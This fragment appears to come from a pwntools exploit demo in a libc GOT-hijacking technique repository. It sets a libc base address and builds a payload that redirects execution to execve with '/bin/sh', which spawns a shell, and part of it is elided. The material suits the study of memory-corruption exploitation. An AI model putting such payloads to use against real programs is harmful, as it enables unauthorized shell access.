# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-Libc-GOT-Hijacking\Pre\Demo\fx0\fx0.py
from pwn import *
...
libc.address = base
dest, payload = fx0(libc, rip=libc.sym["execve"], rdi=libc.search(b"/bin/sh").__next__())
